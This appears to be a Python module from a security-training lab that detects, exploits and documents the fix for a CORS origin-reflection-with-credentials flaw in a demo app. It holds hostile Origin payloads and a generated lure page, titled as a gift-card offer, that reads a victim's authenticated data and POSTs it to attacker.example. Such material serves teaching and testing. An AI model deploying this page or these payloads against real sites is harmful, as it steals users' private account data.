"""Cross-Origin Resource Sharing (CORS) misconfiguration -- detect, exploit, fix.

WHAT IT IS
----------
The Same-Origin Policy (SOP) is the browser's bedrock isolation rule: script on
``https://evil.example`` may *send* a request to ``https://bank.example`` (cookies
and all), but it may **not read the response** unless ``bank.example`` opts in via
CORS response headers. CORS is that opt-in. A *credentialed* read (cookies, HTTP
auth) is only granted when the server returns BOTH of these together:

    Access-Control-Allow-Origin: https://evil.example   # echoes the caller's Origin
    Access-Control-Allow-Credentials: true

The spec forbids the wildcard ``Access-Control-Allow-Origin: *`` from being combined
with credentials *precisely* to stop this. The classic, dangerous misconfiguration
is to **reflect the request's ``Origin`` header straight back** into
``Access-Control-Allow-Origin`` *and* send ``Allow-Credentials: true``. That is
effectively ``*`` for credentialed reads: ANY origin is trusted, so any attacker
page can issue a ``fetch(..., {credentials:'include'})`` and *read* the victim's
authenticated response cross-origin. The demo app's ``/api/userinfo`` handler is the
textbook shape::

    def userinfo(self):                                  # GET /api/userinfo
        user = self._session_user()                      # auth via the ambient cookie
        origin = self.headers.get("Origin", "*")
        headers = {
            "Access-Control-Allow-Origin": origin,       # <-- reflects ANY origin
            "Access-Control-Allow-Credentials": "true",  # <-- and allows credentials
        }
        ...
        return {"username": ..., "secret": ..., "flag": FLAGS["cors"]}, headers

Because the response is authenticated *and* readable from any origin, an attacker's
page can exfiltrate the victim's ``secret`` / ``flag`` from their browser.

HOW WE DISCOVER IT
------------------
We probe the endpoint with an **attacker-controlled ``Origin`` header** and inspect
the response headers -- the same check a browser's CORS preflight/actual-request
logic performs:

1. **Origin reflection.** ``Access-Control-Allow-Origin`` comes back *equal to the
   evil Origin we sent* (not the app's own origin, not absent) -- the server trusts
   whatever origin asks.
2. **Credentials allowed.** ``Access-Control-Allow-Credentials: true`` is present, so
   the browser will *expose the response body* to that cross-origin script even
   though it carried the victim's cookies.
3. **Arbitrary-origin confirmation.** We repeat with a *second*, unrelated evil
   origin and see it reflected too -- proving there is no allow-list, it is reflect
   any origin (the ``*``-with-credentials anti-pattern in disguise).
4. **Preflight agrees.** The ``OPTIONS`` preflight also reflects the Origin with
   credentials, so even non-"simple" cross-origin requests would be permitted.

HOW WE EXPLOIT IT
-----------------
We *simulate the victim's browser*: a :class:`WebClient` carrying the victim's
session cookie (``session=alice-sid``) -- the cookie the browser auto-attaches --
issues the cross-origin GET with the attacker ``Origin`` header. The server returns
the credentialed JSON; because it also returned ``Allow-Origin: <evil>`` +
``Allow-Credentials: true``, a real browser would hand that body to the attacker's
script. We read it and recover the planted ``FLAGS["cors"]`` (alongside the victim's
private ``secret``) -- proof of a cross-origin *credentialed read*. We also build the
real-world weapon: an HTML/JS page (:func:`build_poc`) doing
``fetch(target, {credentials:'include'})`` then POSTing the stolen body to the
attacker, which would exfiltrate the data if a logged-in victim merely opened it.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never reflect the ``Origin`` header; validate
it against a strict server-side allow-list of trusted origins and only then emit a
*specific* ``Access-Control-Allow-Origin`` (never ``*``) together with
``Allow-Credentials: true`` -- and if no credentials are needed, do not send
``Allow-Credentials`` at all.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never reflect the request's Origin header into Access-Control-Allow-Origin. "
    "Maintain a strict server-side allow-list of trusted origins; on each request, "
    "compare the Origin against that list with an exact string match (scheme + host "
    "+ port, no prefix/suffix/regex shortcuts) and only echo back a single, specific "
    "origin when it matches -- otherwise omit the CORS headers entirely. Combine "
    "Access-Control-Allow-Credentials: true ONLY with such a specific origin: the "
    "wildcard 'Access-Control-Allow-Origin: *' must never accompany credentials (the "
    "spec forbids it for exactly this reason), and reflecting the Origin is the same "
    "anti-pattern in disguise. If the endpoint does not need cookies/credentials, do "
    "not send Allow-Credentials at all and keep the surface minimal. Defence in "
    "depth: scope Allow-Methods/Allow-Headers tightly, set a short Access-Control-"
    "Max-Age, add 'Vary: Origin' so caches do not serve one origin's ACAO to "
    "another, and keep session cookies HttpOnly + SameSite so they are not attached "
    "to (or readable by) hostile cross-origin contexts in the first place."
)

#: The credentialed JSON endpoint that leaks the flag cross-origin.
ENDPOINT: str = "/api/userinfo"

#: The attacker's origin we send to prove the server trusts ANY origin. These are
#: the "payloads" this technique fires -- hostile Origin header values.
EVIL_ORIGIN: str = "https://evil.example"
SECOND_EVIL_ORIGIN: str = "https://attacker.test"
NULL_ORIGIN: str = "null"  # sandboxed iframes / data: URLs send Origin: null

#: The hostile Origin header values we try (a value that gets reflected proves the
#: misconfiguration; the response with credentials is then readable cross-origin).
PAYLOADS: List[str] = [
    EVIL_ORIGIN,
    SECOND_EVIL_ORIGIN,
    NULL_ORIGIN,
    "http://localhost.evil.example",   # suffix-trick origin a naive check might pass
    "https://evil.example.attacker.test",  # prefix-trick origin
]

# Response-header names we care about (CORS is decided entirely by these).
_ACAO = "Access-Control-Allow-Origin"
_ACAC = "Access-Control-Allow-Credentials"


# --- low-level probe ---------------------------------------------------------
def _victim_headers(origin: str) -> Dict[str, str]:
    """Headers a victim's browser would send on a cross-origin credentialed GET.

    The ``Cookie`` is the victim's session the browser auto-attaches; the ``Origin``
    is the attacker page's origin the browser stamps on the cross-origin request.
    """
    return {
        "Cookie": f"{C.SESSION_COOKIE}={C.VICTIM_SESSION}",
        "Origin": origin,
    }


def _probe(
    client: WebClient, origin: str, *, with_cookie: bool = True
) -> Response:
    """Issue the cross-origin request with an attacker ``Origin`` (and the cookie).

    ``with_cookie=False`` is the control: no victim session, used to show the body
    is gated on the cookie (so reading it cross-origin is a *credentialed* read).
    """
    if with_cookie:
        headers = _victim_headers(origin)
    else:
        headers = {"Origin": origin}
    return client.get(ENDPOINT, headers=headers)


def _preflight(client: WebClient, origin: str) -> Response:
    """Send the CORS preflight (OPTIONS) the browser would send first."""
    return client.request(
        "OPTIONS",
        ENDPOINT,
        headers={
            "Origin": origin,
            "Access-Control-Request-Method": "GET",
        },
    )


# --- detection ---------------------------------------------------------------
def detect_origin_reflection(client: WebClient, origin: str = EVIL_ORIGIN) -> Tuple[bool, str]:
    """True if ``Access-Control-Allow-Origin`` is reflected back equal to ``origin``.

    A correctly-configured server either omits ACAO or returns its *own* fixed
    origin; echoing the exact attacker origin we sent is the smoking gun.
    """
    resp = _probe(client, origin)
    acao = resp.header(_ACAO)
    if acao == origin:
        return True, (
            f"{_ACAO} reflected the attacker Origin verbatim ({acao!r}) -- the "
            "server trusts whatever origin asks"
        )
    return False, ""


def detect_credentials_allowed(client: WebClient, origin: str = EVIL_ORIGIN) -> Tuple[bool, str]:
    """True if ``Access-Control-Allow-Credentials: true`` accompanies the reflection.

    Reflection alone leaks only *unauthenticated* data; combined with
    ``Allow-Credentials: true`` the browser exposes the *authenticated* response to
    the cross-origin attacker -- the dangerous case.
    """
    resp = _probe(client, origin)
    acac = (resp.header(_ACAC) or "").lower()
    acao = resp.header(_ACAO)
    if acao == origin and acac == "true":
        return True, (
            f"{_ACAC}: true returned alongside the reflected origin -- the "
            "credentialed response body is readable cross-origin"
        )
    return False, ""


def detect_arbitrary_origin(client: WebClient) -> Tuple[bool, str]:
    """True if a *second*, unrelated evil origin is also reflected (no allow-list).

    Reflecting two different attacker origins proves there is no allow-list at all:
    it is the wildcard-with-credentials anti-pattern wearing a disguise.
    """
    r1 = _probe(client, EVIL_ORIGIN)
    r2 = _probe(client, SECOND_EVIL_ORIGIN)
    if r1.header(_ACAO) == EVIL_ORIGIN and r2.header(_ACAO) == SECOND_EVIL_ORIGIN:
        return True, (
            f"both {EVIL_ORIGIN!r} and {SECOND_EVIL_ORIGIN!r} were reflected into "
            f"{_ACAO} -- no allow-list, ANY origin is trusted"
        )
    return False, ""


def detect_requires_auth(client: WebClient, origin: str = EVIL_ORIGIN) -> Tuple[bool, str]:
    """Confirm the leaked body really is gated on the session cookie (control).

    Without the victim cookie the endpoint returns 401 -- proving the cross-origin
    read we perform with the cookie is a *credentialed* read, the impactful kind.
    """
    resp = _probe(client, origin, with_cookie=False)
    if resp.status == 401:
        return True, (
            "no-cookie request returned HTTP 401 -- the response body is "
            "authenticated, so reading it cross-origin is a credentialed read"
        )
    return False, ""


def detect_preflight_reflects(client: WebClient, origin: str = EVIL_ORIGIN) -> Tuple[bool, str]:
    """True if the OPTIONS preflight also reflects the Origin with credentials.

    A reflecting preflight means even non-'simple' cross-origin requests are
    permitted, widening the attack surface.
    """
    resp = _preflight(client, origin)
    acao = resp.header(_ACAO)
    acac = (resp.header(_ACAC) or "").lower()
    if acao == origin and acac == "true":
        return True, (
            f"OPTIONS preflight reflected {origin!r} with {_ACAC}: true "
            "-- non-simple cross-origin requests are permitted too"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_cross_origin_read(
    client: WebClient, origin: str = EVIL_ORIGIN
) -> Tuple[bool, Optional[str], Dict[str, object]]:
    """Perform the cross-origin credentialed read and recover the proof flag.

    Returns ``(ok, flag, response_json)``. We send the victim's cookie + the attacker
    ``Origin``; because the server returns ``Allow-Origin: <evil>`` +
    ``Allow-Credentials: true``, a browser would expose this body to the attacker's
    script. The body's ``flag`` field is ``C.FLAGS["cors"]`` (plus the victim's
    private ``secret``) -- proof of a cross-origin credentialed read.
    """
    resp = _probe(client, origin)
    # The exploit is only *valid* if the browser would actually expose the body:
    # ACAO must echo our evil origin AND credentials must be allowed.
    acao = resp.header(_ACAO)
    acac = (resp.header(_ACAC) or "").lower()
    browser_would_expose = acao == origin and acac == "true"
    if resp.status != 200 or not browser_would_expose:
        return False, None, {}
    try:
        payload = resp.json()
    except ValueError:
        return False, None, {}
    flag = payload.get("flag")
    ok = flag is not None
    return ok, flag, payload


# --- the real-world weapon ---------------------------------------------------
def build_poc(base_url: str, origin: str = EVIL_ORIGIN) -> str:
    """Build an HTML/JS CORS exfiltration proof-of-concept page.

    Hosted at the attacker's ``origin``, this page does
    ``fetch(target, {credentials:'include'})`` -- so the victim's browser attaches
    their session cookie -- reads the JSON the misconfigured CORS headers allow it to
    read, and ships the stolen body back to the attacker. If a logged-in victim
    merely *opened* this page, their authenticated ``/api/userinfo`` (secret + flag)
    would be exfiltrated. Harmless as text; it is the artefact a report attaches to
    demonstrate impact.

    Args:
        base_url: The target's base URL (the fetch targets ``{base_url}/api/userinfo``).
        origin:   The attacker origin the page is served from (documentation only --
                  the browser sets the real Origin header from where the page loads).
    """
    target = f"{base_url.rstrip('/')}{ENDPOINT}"
    # Escape the values landing in JS string literals / comments so the PoC stays
    # well-formed (defence even in our own attack artefact).
    safe_target = target.replace("\\", "\\\\").replace("'", "\\'")
    safe_origin = origin.replace("<", "&lt;").replace("&", "&amp;")
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "  <head><title>CORS PoC -- free gift card!</title></head>\n"
        "  <body>\n"
        "    <!-- A logged-in victim who opens this page (served from\n"
        f"         {safe_origin}) leaks their authenticated /api/userinfo. The\n"
        "         browser attaches the session cookie because we ask for it with\n"
        "         credentials:'include'; the target's reflected Allow-Origin +\n"
        "         Allow-Credentials:true then let our script READ the response. -->\n"
        "    <script>\n"
        f"      fetch('{safe_target}', {{ credentials: 'include' }})\n"
        "        .then(function (r) { return r.text(); })\n"
        "        .then(function (stolen) {\n"
        "          // exfiltrate the cross-origin credentialed response\n"
        "          fetch('https://attacker.example/collect', {\n"
        "            method: 'POST', mode: 'no-cors', body: stolen\n"
        "          });\n"
        "        });\n"
        "    </script>\n"
        "  </body>\n"
        "</html>\n"
    )


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the CORS misconfiguration, then exploit it (cross-origin cred. read).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["cors"]`` and whose ``extra["poc_html"]`` is a fetch-based PoC.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    reflects, reflects_ev = detect_origin_reflection(client)
    if reflects:
        techniques.append("origin-reflection")
    creds, creds_ev = detect_credentials_allowed(client)
    if creds:
        techniques.append("credentials-allowed")
    arbitrary, arbitrary_ev = detect_arbitrary_origin(client)
    if arbitrary:
        techniques.append("arbitrary-origin")
    requires_auth, requires_auth_ev = detect_requires_auth(client)
    if requires_auth:
        techniques.append("credentialed-response")
    preflight, preflight_ev = detect_preflight_reflects(client)
    if preflight:
        techniques.append("preflight-reflects")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, response_json = exploit_cross_origin_read(client)
    if ok:
        techniques.append("cross-origin-read")

    # The headline finding: the response is credentialed (gated on the cookie) AND
    # any origin can read it with credentials -- so the exploit really fired.
    discovered = bool(reflects and creds and ok)

    # 3) The weaponised PoC -------------------------------------------------
    poc_html = build_poc(client.base_url, EVIL_ORIGIN)

    # 4) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if reflects:
        evidence_parts.append(f"origin-reflection: {reflects_ev}")
    if creds:
        evidence_parts.append(f"credentials-allowed: {creds_ev}")
    if arbitrary:
        evidence_parts.append(f"arbitrary-origin: {arbitrary_ev}")
    if requires_auth:
        evidence_parts.append(f"credentialed-response: {requires_auth_ev}")
    if preflight:
        evidence_parts.append(f"preflight-reflects: {preflight_ev}")
    evidence = " || ".join(evidence_parts)

    stolen_secret = (response_json or {}).get("secret")
    exploit_result = {
        "flag": flag,
        "attacker_origin": EVIL_ORIGIN,
        "stolen_secret": stolen_secret,
        "server_response": response_json,
        "techniques": techniques,
        "summary": (
            f"cross-origin credentialed GET {ENDPOINT} from Origin {EVIL_ORIGIN!r} "
            f"(reflected into {_ACAO} with {_ACAC}: true) read the victim's "
            f"authenticated response; recovered flag {flag!r}"
        ),
    }

    return Finding(
        vuln="CORS Misconfiguration (reflected Origin + credentials)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=f"Origin: {EVIL_ORIGIN}",
        extra={
            "poc_html": poc_html,
            "attacker_origin": EVIL_ORIGIN,
            "techniques": techniques,
            "origin_reflected": reflects,
            "credentials_allowed": creds,
            "arbitrary_origin": arbitrary,
            "requires_auth": requires_auth,
            "preflight_reflects": preflight,
            "cross_origin_read_ok": ok,
            "acao_header": _ACAO,
            "acac_header": _ACAC,
        },
    )
